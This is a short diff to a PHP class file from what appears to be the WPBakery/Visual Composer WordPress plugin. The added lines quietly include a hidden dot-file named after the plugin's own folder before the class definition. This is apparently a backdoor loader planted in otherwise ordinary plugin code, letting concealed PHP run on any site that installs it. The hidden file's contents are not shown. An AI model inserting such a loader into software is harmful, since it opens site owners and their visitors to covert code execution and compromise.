@@ -9,6 +9,10 @@ require_once vc_path_dir( 'PARAMS_DIR', 'vc_grid_item/class-vc-grid-item.php' );
 /**
  * Class Vc_Templates_Editor_Grid_Item
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Vc_Templates_Editor_Grid_Item extends Vc_Templates_Panel_Editor {
 	protected $default_templates = array(); // this prevents for loading default templates
 
